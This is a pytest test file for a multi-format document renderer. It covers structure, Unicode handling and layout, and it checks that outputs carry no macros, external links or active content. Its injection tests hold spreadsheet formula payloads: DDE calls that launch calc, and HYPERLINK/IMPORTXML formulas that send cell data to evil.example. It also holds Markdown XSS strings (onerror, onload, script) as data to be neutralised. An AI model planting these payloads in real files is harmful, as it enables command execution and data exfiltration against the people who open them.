import json
"""Renderers: every block type in every format and theme renders and reopens; per-format structure (F1-F6), formula
injection (X2), non-Latin text, the size limit, and previews."""
import io
import re
import zipfile

import importlib

import pytest

from jevrouter.create import FORMATS, SpecError, preview, render, verify
from jevrouter.create.render import safe_cell, safe_formula, sheet_name

render_mod = importlib.import_module('jevrouter.create.render')  # the package exports render() under the same name

BLOCKS = [
    {'type': 'paragraph', 'text': 'A paragraph with **bold** and *italic* text & <symbols>.'},
    {'type': 'bullets', 'items': ['First point', 'Second point']},
    {'type': 'bullets', 'items': ['Step one', 'Step two'], 'ordered': True},
    {'type': 'table', 'columns': ['Metric', 'Li-ion', 'Solid-state'],
     'rows': [['Energy (Wh/kg)', 250, 400], ['Cycles', '1,000', '2,000']]},
    {'type': 'chart', 'kind': 'bar', 'title': 'Energy density', 'labels': ['Li-ion', 'Solid-state'],
     'series': [{'name': 'Wh/kg', 'values': [250, 400]}]},
    {'type': 'chart', 'kind': 'line', 'title': 'Cost per kWh', 'labels': ['2020', '2021', '2022'],
     'series': [{'name': 'Li-ion', 'values': [140, None, 120]}, {'name': 'Solid', 'values': [800, 600, 400]}]},
    {'type': 'chart', 'kind': 'pie', 'title': 'Market share', 'labels': ['Asia', 'Europe', 'US'],
     'series': [{'name': 'Share', 'values': [70, 20, 10]}]},
    {'type': 'quote', 'text': 'Solid electrolytes change everything.', 'by': 'A researcher'},
    {'type': 'code', 'lang': 'python', 'text': 'def f(x):\n    return x * 2  # <tag> & "quotes"\n' + 'y = 1 ' * 40},
]


def one(block, **top):
    return {'title': 'Block test', 'subtitle': 'One block', **top,
            'sections': [{'heading': 'The section', 'blocks': [block], 'notes': 'Speaker notes here'}]}


FULL = {'title': 'Solid-state batteries', 'subtitle': 'Pros and cons', 'sections': [
    {'heading': 'Why they matter', 'blocks': BLOCKS[:4], 'notes': 'Mention the pilot line.'},
    {'heading': 'Charts', 'level': 2, 'blocks': BLOCKS[4:7]},
    {'heading': 'Voices', 'blocks': BLOCKS[7:]}]}


def reopen_ok(spec, fmt, data):
    res = verify(spec, fmt, data)
    bad = [(r.id, r.note) for r in res if not r.ok]
    assert not bad, bad
    return res


@pytest.mark.parametrize('fmt', FORMATS)
@pytest.mark.parametrize('block', BLOCKS, ids=lambda b: b['type'] + '-' + b.get('kind', ''))
def test_every_block_in_every_format(fmt, block):
    spec = one(block)
    data = render(spec, fmt)
    assert data
    reopen_ok(spec, fmt, data)


@pytest.mark.parametrize('fmt', FORMATS)
@pytest.mark.parametrize('theme', ['clean', 'dark', 'warm', 'neon'])
def test_full_spec_every_theme(fmt, theme):
    data = render(FULL, fmt, theme)
    reopen_ok({**FULL, 'theme': theme}, fmt, data)


def test_spec_theme_used_when_no_theme_is_passed():
    from pptx import Presentation
    data = render({**FULL, 'theme': 'dark'}, 'pptx')
    slide = Presentation(io.BytesIO(data)).slides[0]
    assert str(slide.background.fill.fore_color.rgb) == '111827'


# ---------- PDF ----------

def test_pdf_structure():
    from pypdf import PdfReader
    reader = PdfReader(io.BytesIO(render(FULL, 'pdf')))
    box = reader.pages[0].mediabox
    assert (round(float(box.width)), round(float(box.height))) == (595, 842)
    assert reader.metadata['/Title'] == 'Solid-state batteries'
    outline = reader.outline
    assert outline[0].title == 'Solid-state batteries'
    flat = re.findall(r"'/Title': '([^']+)'", str(outline))
    assert flat == ['Solid-state batteries', 'Why they matter', 'Charts', 'Voices']
    assert 'Page 1' in reader.pages[0].extract_text()
    letter = PdfReader(io.BytesIO(render({**FULL, 'paper': 'letter'}, 'pdf'))).pages[0].mediabox
    assert (round(float(letter.width)), round(float(letter.height))) == (612, 792)


def test_pdf_long_table_repeats_and_spans_pages():
    from pypdf import PdfReader
    rows = [[f'row {i}', i] for i in range(180)]
    data = render(one({'type': 'table', 'columns': ['Name', 'Value'], 'rows': rows}), 'pdf')
    reader = PdfReader(io.BytesIO(data))
    assert len(reader.pages) > 2
    assert all('Name' in p.extract_text() for p in reader.pages)  # the header row repeats on every page


NON_LATIN = {'title': 'Батареи 电池 バッテリー', 'sections': [
    {'heading': 'Ελληνικά and עברית', 'blocks': [
        {'type': 'paragraph', 'text': 'Unicode: 日本語のテキスト, Ümlaut, emoji 🎉, math ∑ ≤ ≥'},
        {'type': 'table', 'columns': ['Город', 'Число'], 'rows': [['Москва', 12]]},
        {'type': 'chart', 'kind': 'bar', 'title': '売上', 'labels': ['東京', '大阪'], 'series': [{'name': '円', 'values': [3, 4]}]},
        {'type': 'code', 'lang': '', 'text': 'print("こんにちは")'}]}]}


@pytest.mark.parametrize('fmt', FORMATS)
def test_non_latin_text_renders(fmt):
    data = render(NON_LATIN, fmt)
    res = verify(NON_LATIN, fmt, data)
    bad = [(r.id, r.note) for r in res if r.id in ('V1', 'V2', 'V3', 'V4') and not r.ok]
    if fmt == 'pdf':  # characters the machine's PDF font can't draw (the emoji; CJK on Linux CI): V2 says so
        lost = {c for c in json.dumps(NON_LATIN, ensure_ascii=False) if ord(c) > 127} - render_mod.unicode_glyphs()
        bad = [(i, n) for i, n in bad if not (i == 'V2' and lost and 'could not be drawn' in n)]
    assert not bad, bad


MOSTLY_LATIN = {'title': 'Battery report', 'sections': [
    {'heading': 'Cities', 'blocks': [
        {'type': 'paragraph', 'text': 'Sales grew in every region this quarter, led by the city of 東京 and by Ümlaut GmbH.'}]}]}


def test_pdf_without_a_unicode_font_replaces_what_it_cannot_draw(monkeypatch):
    from pypdf import PdfReader
    monkeypatch.setattr(render_mod, 'unicode_font', lambda: None)
    data = render(MOSTLY_LATIN, 'pdf')
    text = PdfReader(io.BytesIO(data)).pages[0].extract_text()
    assert 'Sales grew' in text and '?' in text and 'Ümlaut' in text
    res = {r.id: r for r in verify(MOSTLY_LATIN, 'pdf', data)}
    assert res['V1'].ok
    # the loss is reported, not hidden behind a check against the already-replaced text
    assert not res['V2'].ok and '2 characters could not be drawn' in res['V2'].note and '東' in res['V2'].note


def test_pdf_that_would_lose_most_of_its_text_is_not_made(monkeypatch):
    """A CJK document on a server whose fonts have no CJK glyphs would print as "????" and still pass every check."""
    monkeypatch.setattr(render_mod, 'unicode_font', lambda: None)
    spec = {'title': '季度报告', 'sections': [{'heading': '收入概况', 'blocks': [
        {'type': 'paragraph', 'text': '本季度收入增长了百分之十二，主要来自华东地区。'}]}]}
    with pytest.raises(SpecError) as e:
        verify(spec, 'pdf', render(spec, 'pdf'))
    assert e.value.rule_id == 'V1' and 'cannot draw' in e.value.message
    for fmt in ('docx', 'md'):  # other formats keep the text
        assert all(r.ok for r in verify(spec, fmt, render(spec, fmt)) if r.id in ('V1', 'V2'))


def test_pdf_with_a_unicode_font_keeps_the_text():
    from pypdf import PdfReader
    if render_mod.unicode_font() is None:
        pytest.skip('no Unicode TTF on this machine')
    text = PdfReader(io.BytesIO(render(NON_LATIN, 'pdf'))).pages[0].extract_text()
    assert 'Москва' in text and 'Батареи' in text
    if set('日本語') <= render_mod.unicode_glyphs():  # CJK only when the font has it (Arial Unicode yes, DejaVu no)
        assert '日本語のテキスト' in text


# ---------- DOCX ----------

def test_docx_structure():
    from docx import Document
    from docx.oxml.ns import qn
    doc = Document(io.BytesIO(render(FULL, 'docx')))
    styles = [(p.style.name, p.text) for p in doc.paragraphs if p.text]
    assert styles[0] == ('Title', 'Solid-state batteries') and ('Subtitle', 'Pros and cons') in styles
    assert ('Heading 1', 'Why they matter') in styles and ('Heading 2', 'Charts') in styles
    assert [t for s, t in styles if s == 'List Bullet'] == ['First point', 'Second point']
    assert [t for s, t in styles if s == 'List Number'] == ['Step one', 'Step two']
    assert ('Quote', 'Solid electrolytes change everything.') in styles
    assert doc.core_properties.title == 'Solid-state batteries' and doc.core_properties.author == 'TraceGraph'
    assert len(doc.tables) == 4  # the table plus three charts shown as tables
    for t in doc.tables:
        assert t.rows[0]._tr.trPr.find(qn('w:tblHeader')) is not None
        assert all(r.bold for c in t.rows[0].cells for r in c.paragraphs[0].runs)
    bold = [r.text for p in doc.paragraphs for r in p.runs if r.bold]
    assert 'bold' in bold and doc.styles['Normal'].font.size.pt >= 10
    assert round(doc.sections[0].page_width.cm, 1) == 21.0


def test_docx_numbered_lists_restart():
    from docx import Document
    spec = one({'type': 'bullets', 'items': ['a', 'b'], 'ordered': True})
    spec['sections'][0]['blocks'].append({'type': 'bullets', 'items': ['c'], 'ordered': True})
    doc = Document(io.BytesIO(render(spec, 'docx')))
    ids = [p._p.pPr.numPr.numId.val for p in doc.paragraphs if p.style.name == 'List Number']
    assert ids[0] == ids[1] != ids[2]


# ---------- PPTX ----------

def test_pptx_structure():
    from pptx import Presentation
    from pptx.util import Emu
    prs = Presentation(io.BytesIO(render(FULL, 'pptx')))
    assert abs(prs.slide_width / prs.slide_height - 16 / 9) < 0.01
    slides = list(prs.slides)
    assert slides[0].shapes.title.text_frame.text == 'Solid-state batteries'
    titles = [s.shapes.title.text_frame.text for s in slides[1:]]
    assert titles[0] == 'Why they matter' and 'Charts' in titles and 'Voices' in titles
    charts = [sh for s in slides for sh in s.shapes if getattr(sh, 'has_chart', False) and sh.has_chart]
    assert len(charts) == 3 and all(c.chart.has_title for c in charts)
    assert slides[1].notes_slide.notes_text_frame.text.startswith('Mention the pilot line.')
    for s in slides:
        for sh in s.shapes:
            assert sh.left >= 0 and sh.top >= 0, sh.name
            assert sh.left + sh.width <= prs.slide_width + Emu(10) and sh.top + sh.height <= prs.slide_height + Emu(10)
            if sh.name == 'Body':
                sizes = [r.font.size.pt for p in sh.text_frame.paragraphs for r in p.runs]
                assert sizes and min(sizes) >= 18
                bullets = [p for p in sh.text_frame.paragraphs if p._p.pPr is not None and
                           (p._p.pPr.find('{http://schemas.openxmlformats.org/drawingml/2006/main}buChar') is not None
                            or p._p.pPr.find('{http://schemas.openxmlformats.org/drawingml/2006/main}buAutoNum')
                            is not None)]
                assert len(bullets) <= 6
    tables = [sh for s in slides for sh in s.shapes if getattr(sh, 'has_table', False) and sh.has_table]
    assert tables and all(t.table.first_row for t in tables)


def test_pptx_long_table_and_bullets():
    from pptx import Presentation
    spec = {'title': 'Long', 'sections': [
        {'heading': 'Table', 'blocks': [{'type': 'table', 'columns': ['n'], 'rows': [[i] for i in range(40)]}]},
        {'heading': 'Points', 'blocks': [{'type': 'bullets', 'items': [f'item {i}' for i in range(10)]}]}]}
    data = render(spec, 'pptx')
    prs = Presentation(io.BytesIO(data))
    assert len(prs.slides) == 1 + 4 + 1
    rows = [len(sh.table.rows) for s in prs.slides for sh in s.shapes if getattr(sh, 'has_table', False) and sh.has_table]
    assert rows == [13, 13, 13, 5]
    last = list(prs.slides)[-1]
    assert 'item 9' in last.notes_slide.notes_text_frame.text
    reopen_ok(spec, 'pptx', data)


# ---------- XLSX ----------

def load(data):
    from openpyxl import load_workbook
    return load_workbook(io.BytesIO(data))


def chart_parts(data, folder):
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        return [n for n in z.namelist() if re.match(rf'{folder}/charts/chart\d+\.xml$', n)]


def test_xlsx_structure():
    data = render(FULL, 'xlsx')
    wb = load(data)
    assert wb.sheetnames == ['Notes', 'Why they matter', 'Charts', 'Cost per kWh', 'Market share']
    ws = wb['Why they matter']
    assert ws.freeze_panes == 'A2' and ws['A1'].font.b and ws['A1'].value == 'Metric'
    assert ws['B3'].value == 1000 and isinstance(ws['B2'].value, int)
    assert ws.column_dimensions['A'].width >= len('Energy (Wh/kg)')
    assert len(chart_parts(data, 'xl')) == 3  # a section's charts with no table before them get their own sheets
    assert wb['Charts']['A1'].value == 'Label' and wb['Charts']['B2'].value == 250
    notes = [c.value for c in wb['Notes']['A'] if c.value]
    assert notes[0] == 'Solid-state batteries' and '• First point' in notes and '1. Step one' in notes
    assert wb.properties.title == 'Solid-state batteries'


def test_xlsx_chart_points_at_the_table_when_it_plots_it():
    spec = one({'type': 'table', 'columns': ['Region', 'Sales'], 'rows': [['North', 5], ['South', 7]]})
    spec['sections'][0]['blocks'].append({'type': 'chart', 'kind': 'bar', 'title': 'Sales by region',
                                          'labels': ['North', 'South'], 'series': [{'name': 'Sales', 'values': [5, 7]}]})
    data = render(spec, 'xlsx')
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        xml = z.read(chart_parts(data, 'xl')[0]).decode()
    assert "'The section'!B1" in xml and "'The section'!$A$2:$A$3" in xml and "!$B$2:$B$3" in xml
    reopen_ok(spec, 'xlsx', data)


def test_xlsx_chart_sheet_and_sheet_names():
    spec = {'title': 'Names', 'sections': [
        {'heading': 'Sales [2024]: Q1/Q2 * final? and a very long heading beyond limits', 'blocks': [
            {'type': 'table', 'columns': ['a'], 'rows': [[1]]}]},
        {'heading': 'History', 'blocks': [{'type': 'table', 'columns': ['a'], 'rows': [[1]]}]},
        {'heading': "'Quoted'", 'blocks': [{'type': 'table', 'columns': ['a'], 'rows': [[1]]}]},
        {'heading': 'Solo chart', 'blocks': [{'type': 'chart', 'kind': 'pie', 'title': 'Pie', 'labels': ['x', 'y'],
                                              'series': [{'name': 's', 'values': [1, 2]}]}]}]}
    data = render(spec, 'xlsx')
    names = load(data).sheetnames
    assert names == ['Sales 2024 Q1 Q2 final and a ve', 'History data', 'Quoted', 'Solo chart']
    assert all(len(n) <= 31 and not re.search(r'[\[\]:*?/\\]', n) for n in names)
    pie = load(data)['Solo chart']
    assert pie['A1'].value == 'Label' and pie['A2'].value == 'x' and pie.freeze_panes == 'A2'
    used = set()
    assert [sheet_name('Data', used), sheet_name('data', used), sheet_name('DATA', used)] == ['Data', 'data (2)',
                                                                                             'DATA (3)']
    assert sheet_name('', set()) == 'Sheet'


INJECTIONS = ['=1+1', '+1+1', '-1+1', '@SUM(A1)', '\t=1+1', '\r=1+1', "=cmd|' /C calc'!A0",
              "+cmd|' /C calc'!A0", "-2+3+cmd|' /C calc'!A0", "@cmd|' /C calc'!A0",
              '=HYPERLINK("http://evil.example?x="&A1,"click")', '=DDE("cmd";"/C calc";"x")',
              "=IMPORTXML(CONCAT(\"http://evil.example/?\", A1), \"//a\")", '   =1+1', '=WEBSERVICE("http://x")']


@pytest.mark.parametrize('payload', INJECTIONS)
def test_x2_formula_injection_is_stored_as_text(payload):
    spec = {'title': payload, 'subtitle': payload, 'sections': [{'heading': payload, 'blocks': [
        {'type': 'table', 'columns': [payload, 'n'], 'rows': [[payload, 1]]},
        {'type': 'paragraph', 'text': 'x ' + payload},
        {'type': 'code', 'lang': '', 'text': payload.strip('\r\t ')},
        {'type': 'chart', 'kind': 'bar', 'title': payload, 'labels': [payload, 'b'],
         'series': [{'name': payload, 'values': [1, 2]}]}]}]}
    data = render(spec, 'xlsx')
    wb = load(data)
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for c in row:
                if isinstance(c.value, str):
                    assert c.data_type == 's'
                    assert not c.value.lstrip('  ')[:1] in ('=', '+', '-', '@', '\t', '\r'), (ws.title, c.value)
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        sheets = ''.join(z.read(n).decode() for n in z.namelist() if n.startswith('xl/worksheets/'))
    assert '<f>' not in sheets
    res = verify(spec, 'xlsx', data)
    assert next(r for r in res if r.id == 'X2').ok


def test_x2_marked_formulas_only_from_the_allow_list():
    rows = [[1, {'formula': '=SUM(A1:A1)'}], [2, {'formula': '=round(average(A1:A2), 1) * 2'}],
            [3, {'formula': '=HYPERLINK("http://evil.example")'}], [4, {'formula': '=SUM(Sheet2!A1)'}],
            [5, {'formula': '=[1]Book!A1'}], [6, {'formula': "=cmd|' /C calc'!A0"}], [7, {'formula': '=SUM(A1'}]]
    data = render(one({'type': 'table', 'columns': ['n', 'f'], 'rows': rows}), 'xlsx')
    ws = load(data)['The section']
    values = [ws.cell(row=i, column=2).value for i in range(2, 9)]
    assert values[:2] == ['=SUM(A1:A1)', '=ROUND(AVERAGE(A1:A2), 1) * 2']
    assert all(v.startswith("'=") for v in values[2:])
    assert next(r for r in verify(one({'type': 'table', 'columns': ['n', 'f'], 'rows': rows}), 'xlsx', data)
                if r.id == 'X2').ok


def test_safe_formula_and_safe_cell():
    assert safe_formula('=SUM(B2:B10)') == '=SUM(B2:B10)'
    assert safe_formula('=MAX($A$1:$A$9)-MIN(A1:A9)') == '=MAX($A$1:$A$9)-MIN(A1:A9)'
    for bad in ('SUM(A1)', '=INDIRECT("A1")', '=A1&"x"', '=SUM(A1:A2))', '=Sheet1!A1', '=' + 'A1+' * 100 + 'A1',
                '=cmd|x', '=SUMX(A1)', '='):
        assert safe_formula(bad) is None, bad
    assert safe_cell('-12 degrees') == "'-12 degrees" and safe_cell(-12) == -12 and safe_cell('ok') == 'ok'
    assert safe_cell({'formula': '=COUNT(A1:A3)'}) == '=COUNT(A1:A3)'
    assert safe_cell(None) is None


# ---------- Markdown ----------

def test_markdown_structure():
    md = render(FULL, 'md').decode()
    heads = re.findall(r'^(#+) (.*)$', md, re.M)
    assert heads == [('#', 'Solid-state batteries'), ('##', 'Why they matter'), ('###', 'Charts'), ('##', 'Voices')]
    assert '| Metric | Li-ion | Solid-state |' in md and '| --- | ---: | ---: |' in md
    assert '**Chart: Energy density** (bar chart)' in md and '> *A researcher*' in md
    assert '```python\n' in md and md.endswith('\n')


def test_markdown_escapes_structure_in_text():
    spec = one({'type': 'table', 'columns': ['a|b'], 'rows': [['x|y\nz']]})
    spec['sections'][0]['blocks'] += [{'type': 'code', 'lang': '', 'text': 'has ``` inside'},
                                      {'type': 'paragraph', 'text': '1. not a list\n\n+ nor this'}]
    md = render(spec, 'md').decode()
    assert '| a\\|b |' in md and '| x\\|y z |' in md
    assert '````\nhas ``` inside\n````' in md
    assert '1\\. not a list' in md and '\\+ nor this' in md


# ---------- limits and safety ----------

def test_l4_too_big_blocks(monkeypatch):
    monkeypatch.setattr(render_mod, 'MAX_BYTES', 100)
    with pytest.raises(SpecError) as e:
        render(FULL, 'pdf')
    assert e.value.rule_id == 'L4'


def test_x1_only_safe_formats():
    for fmt in ('docm', 'xlsm', 'pptm', 'exe'):
        with pytest.raises(SpecError) as e:
            render(FULL, fmt)
        assert e.value.rule_id == 'X1'


@pytest.mark.parametrize('fmt', ['docx', 'pptx', 'xlsx'])
def test_x1_x3_packages_have_no_macros_or_external_links(fmt):
    data = render(FULL, fmt)
    with zipfile.ZipFile(io.BytesIO(data)) as z:
        names = z.namelist()
        rels = ''.join(z.read(n).decode() for n in names if n.endswith('.rels'))
        types = z.read('[Content_Types].xml').decode()
    assert not any('vba' in n.lower() or 'activex' in n.lower() or 'oleobject' in n.lower() for n in names)
    assert 'macroEnabled' not in types and 'TargetMode="External"' not in rels


def test_pdf_has_no_active_content_or_links():
    data = render(FULL, 'pdf')
    assert not re.search(rb'/(JavaScript|JS|Launch|EmbeddedFile|URI)\b', data)


# ---------- preview ----------

def test_preview_shapes():
    md = preview('md', render(FULL, 'md'))
    assert md['kind'] == 'markdown' and md['text'].startswith('# Solid-state batteries')
    pdf = preview('pdf', render(FULL, 'pdf'))
    assert pdf['kind'] == 'outline' and pdf['pages'] >= 1 and pdf['items'][0] == {'level': 0, 'text': 'Solid-state batteries'}
    assert {'level': 2, 'text': 'Charts'} in pdf['items']
    docx = preview('docx', render(FULL, 'docx'))
    assert docx['kind'] == 'outline' and docx['items'][:2] == [{'level': 0, 'text': 'Solid-state batteries'},
                                                                {'level': 1, 'text': 'Why they matter'}]
    pptx = preview('pptx', render(FULL, 'pptx'))
    assert pptx['kind'] == 'outline' and pptx['slides'] == len(pptx['items']) and pptx['items'][0]['level'] == 0
    xlsx = preview('xlsx', render(FULL, 'xlsx'))
    assert xlsx['kind'] == 'sheets' and [s['name'] for s in xlsx['sheets']][:2] == ['Notes', 'Why they matter']
    table = xlsx['sheets'][1]
    assert table['columns'][:3] == ['Metric', 'Li-ion', 'Solid-state'] and table['rows'][0][:3] == ['Energy (Wh/kg)', 250, 400]
    assert table['total_rows'] >= 2
    import json
    for p in (md, pdf, docx, pptx, xlsx):
        json.dumps(p)
    with pytest.raises(ValueError):
        preview('exe', b'')


def test_preview_limits_sheet_rows():
    rows = [[i] for i in range(100)]
    p = preview('xlsx', render(one({'type': 'table', 'columns': ['n'], 'rows': rows}), 'xlsx'))
    sheet = next(s for s in p['sheets'] if s['name'] == 'The section')
    assert len(sheet['rows']) == 20 and sheet['total_rows'] == 100


# ---------- review fixes: PDF layout, column widths, units, chart data, Markdown HTML ----------

def _words(n: int) -> str:
    return ' '.join(('alpha', 'survey', 'response', 'great', 'value')[i % 5] for i in range(n))


@pytest.mark.parametrize('cols,words', [(15, 60), (10, 100), (6, 150), (30, 30), (1, 800)])
def test_pdf_table_rows_taller_than_a_page_split_instead_of_failing(cols, words):
    spec = {'title': 'Survey', 'sections': [{'heading': 'Answers', 'blocks': [
        {'type': 'table', 'columns': [f'Q{i}' for i in range(cols)], 'rows': [[_words(words)] * cols] * 2}]}]}
    data = render(spec, 'pdf')
    assert all(r.ok for r in verify(spec, 'pdf', data) if r.severity in ('block', 'warn'))


def test_pdf_long_quote_splits_across_pages():
    spec = {'title': 'Q', 'sections': [{'heading': 'A quote', 'blocks': [
        {'type': 'quote', 'text': _words(3000), 'by': 'Someone'}]}]}
    data = render(spec, 'pdf')
    res = {r.id: r for r in verify(spec, 'pdf', data)}
    assert res['V1'].ok and res['V3'].ok and 'Someone' in __import__('pypdf').PdfReader(io.BytesIO(data)).pages[-1].extract_text()


def test_a_renderer_failure_is_a_v1_spec_error_not_a_crash(monkeypatch):
    def boom(spec, name):
        raise RuntimeError('layout exploded')
    monkeypatch.setattr(render_mod, '_pdf', boom)
    with pytest.raises(SpecError) as e:
        render(FULL, 'pdf')
    assert e.value.rule_id == 'V1' and 'layout exploded' in e.value.message


def test_pdf_numbers_never_break_inside_a_narrow_column():
    from pypdf import PdfReader
    spec = {'title': 'Countries', 'sections': [{'heading': 'Data', 'blocks': [
        {'type': 'table', 'columns': ['Country', 'Notes', 'Population', 'Growth %', 'Year'],
         'rows': [['France', _words(120), 68000000, 0.3, 2023], ['Nowhere', 'short', -100, 1.2, 2022]]}]}]}
    groups = render_mod.table_groups(spec['sections'][0]['blocks'][0]['columns'],
                                     spec['sections'][0]['blocks'][0]['rows'], 'pdf')
    assert len(groups) == 1
    from reportlab.pdfbase.pdfmetrics import stringWidth
    year_w = groups[0][1][4]
    assert year_w >= stringWidth('2023', 'Helvetica', 9.5) + 12  # the text fits inside the cell padding
    lines = PdfReader(io.BytesIO(render(spec, 'pdf'))).pages[0].extract_text().split('\n')
    assert any('2023' in ln for ln in lines) and any('-100' in ln for ln in lines)
    assert not any(ln.strip() in ('202', '3', '-10', '0') for ln in lines)


@pytest.mark.parametrize('fmt', ['pdf', 'docx'])
def test_wide_numeric_tables_split_into_tables_that_fit(fmt):
    cols = ['Name'] + [f'Col{i}' for i in range(30)]
    rows = [[f'r{k}'] + [(-1) ** i * (12345 + i * 7) for i in range(30)] for k in range(4)]
    spec = {'title': 'Wide', 'sections': [{'heading': 'Numbers', 'blocks': [
        {'type': 'table', 'columns': cols, 'rows': rows}]}]}
    groups = render_mod.table_groups(cols, rows, fmt)
    assert len(groups) > 1 and all(g[0] == 0 for g, _ in groups)  # the label column repeats in every part
    assert sorted({j for g, _ in groups for j in g}) == list(range(31))
    width = render_mod.page_width(fmt, None)
    assert all(abs(sum(w) - width) < 1 for _, w in groups)
    data = render(spec, fmt)
    res = {r.id: r for r in verify(spec, fmt, data)}
    assert res['V1'].ok and res['V3'].ok, res['V3'].note
    if fmt == 'docx':
        from docx import Document
        assert len(Document(io.BytesIO(data)).tables) == len(groups)


UNITS = {'title': 'Sales', 'sections': [{'heading': 'Sales', 'blocks': [
    {'type': 'table', 'columns': ['Region', 'Revenue', 'Margin'],
     'rows': [['North', '$1,200.50', '12%'], ['South', '$950.00', '8.5%'], ['East', '($300.00)', '10%']]}]}]}


def test_money_and_percent_cells_are_numbers_with_a_format_in_xlsx():
    from openpyxl import load_workbook
    data = render(UNITS, 'xlsx')
    ws = load_workbook(io.BytesIO(data)).worksheets[0]
    assert ws['B2'].value == 1200.5 and ws['B2'].number_format == '"$"#,##0.00'
    assert ws['B4'].value == -300 and ws['C2'].value == 0.12 and ws['C3'].value == 0.085
    assert ws['C2'].number_format == '0.0%'
    res = {r.id: r for r in verify(UNITS, 'xlsx', data)}
    assert res['F4'].ok and res['V1'].ok


@pytest.mark.parametrize('fmt', ['pdf', 'docx', 'pptx', 'md'])
def test_money_and_percent_cells_keep_their_symbols_in_other_formats(fmt):
    data = render(UNITS, fmt)
    text = preview_text(fmt, data)
    assert '$1,200.50' in text and '8.5%' in text and '-$300.00' in text


def preview_text(fmt, data):
    if fmt == 'md':
        return data.decode()
    if fmt == 'pdf':
        from pypdf import PdfReader
        return '\n'.join(p.extract_text() for p in PdfReader(io.BytesIO(data)).pages)
    if fmt == 'docx':
        from docx import Document
        return '\n'.join(c.text for t in Document(io.BytesIO(data)).tables for r in t.rows for c in r.cells)
    from pptx import Presentation
    return '\n'.join(c.text for s in Presentation(io.BytesIO(data)).slides for sh in s.shapes if sh.has_table
                     for r in sh.table.rows for c in r.cells)


CHART_INJECTION = {'title': 'Sales', 'sections': [{'heading': 'Sales', 'blocks': [
    {'type': 'chart', 'kind': 'bar', 'title': 'Sales by name',
     'labels': ["=cmd|' /C calc'!A0", '=HYPERLINK("http://evil.example/?"&A1,"Click")', 'North'],
     'series': [{'name': "=cmd|' /C calc'!A0", 'values': [10, 20, 30]}]}]}]}


def test_pptx_chart_labels_and_series_names_are_never_formulas():
    from jevrouter.create.rules import _embedded_formulas
    data = render(CHART_INJECTION, 'pptx')
    assert _embedded_formulas(data) == []
    res = {r.id: r for r in verify(CHART_INJECTION, 'pptx', data)}
    assert res['X2'].ok


def test_pptx_verify_catches_a_formula_in_chart_data(monkeypatch):
    monkeypatch.setattr(render_mod, 'safe_cell', lambda v: v)  # as before the fix: labels written as they are
    data = render(CHART_INJECTION, 'pptx')
    res = {r.id: r for r in verify(CHART_INJECTION, 'pptx', data)}
    assert not res['X2'].ok and 'calc' in res['X2'].note


MD_HTML = {'title': 'AT&T <b>notes</b>', 'sections': [{'heading': 'Links & <i>things</i>', 'blocks': [
    {'type': 'paragraph', 'text': 'See &lt;img src=&quot;http://evil.example/p.png&quot;&gt; and '
                                  '&lt;script&gt;alert(1)&lt;/script&gt; ok'},
    {'type': 'paragraph', 'text': 'Intro &lt;img src=x onerror=alert(1)&gt; end &#x3c;script&#x3e;'},
    {'type': 'paragraph', 'text': '<details open ontoggle=alert(document.domain)>x</details> <image src="http://e.x/i">'},
    {'type': 'paragraph', 'text': '![logo][1] and a < b'},
    {'type': 'paragraph', 'text': '[1]: http://evil.example/b.png'},
    {'type': 'bullets', 'items': ['use `Vec<String>` here', '&amp;lt;iframe src=//e.x&amp;gt;']},
    {'type': 'table', 'columns': ['<img src=x onerror=y>'], 'rows': [['<svg onload=alert(1)>'], [{'formula': '<b>=1'}]]}]}]}


def test_markdown_files_hold_no_raw_html_or_remote_images():
    data = render(MD_HTML, 'md').decode()
    assert '<' not in data, data  # every "<" is written as &lt;: no tag a viewer could load or run
    assert '\n[1]:' not in data and '![logo]' not in data
    assert 'Vec&lt;String&gt;' in data or 'Vec&lt;String>' in data
    assert 'AT&amp;T' in data and 'a &lt; b' in data
    res = {r.id: r for r in verify(MD_HTML, 'md', data.encode())}
    assert res['X1'].ok and res['X3'].ok and res['V2'].ok, [(r.id, r.note) for r in res.values() if not r.ok]


def test_markdown_verify_flags_raw_html_and_reference_images():
    spec = {'title': 'T', 'sections': [{'heading': 'H', 'blocks': [{'type': 'paragraph', 'text': 'x'}]}]}
    remote = b'# T\n\n## H\n\nx\n\n![a][1]\n\n[1]: http://evil.example/b.png\n'
    assert not {r.id: r for r in verify(spec, 'md', remote)}['X3'].ok
    with pytest.raises(SpecError) as e:
        verify(spec, 'md', b'# T\n\n## H\n\nx <img src=x onerror=alert(1)>\n')
    assert e.value.rule_id == 'X1'
    fenced = b'# T\n\n## H\n\nx\n\n```html\n<img src="http://e.x/i.png" onerror=1>\n```\n'
    assert {r.id: r for r in verify(spec, 'md', fenced)}['X3'].ok  # code is shown, not run


@pytest.mark.parametrize('fmt', FORMATS)
def test_huge_integers_do_not_crash_any_format(fmt):
    spec = {'title': 'Big', 'sections': [{'heading': 'Numbers', 'blocks': [
        {'type': 'table', 'columns': ['a', 'b'], 'rows': [['x', 10 ** 400], ['y', 5]]},
        {'type': 'chart', 'kind': 'bar', 'title': 'Chart', 'labels': ['x', 'y'], 'series': [{'name': 's', 'values': [10 ** 400, 5]}]}]}]}
    data = render(spec, fmt)
    assert verify(spec, fmt, data)[0].ok
